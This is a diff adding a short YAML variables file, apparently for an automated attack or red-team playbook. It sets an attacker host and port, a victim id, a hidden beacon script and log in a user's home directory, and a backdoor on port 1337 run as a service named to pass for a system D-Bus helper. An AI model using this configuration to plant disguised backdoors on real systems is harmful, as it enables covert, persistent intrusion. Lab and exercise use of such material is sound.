@@ -1,0 +1,11 @@
+---
+username: cyrano
+attacker_host: attacker
+attacker_port: 4444
+worker_id: "victim-1"
+beacon_script: "/home/cyrano/.kit_beacon.sh"
+beacon_log: "/home/cyrano/.kit_beacon.log"
+beacon_service: "/bin/espeon.service"
+beacon_interval: 120
+backdoor_port: 1337
+backdoor_service: "dbus-session-helper.service"
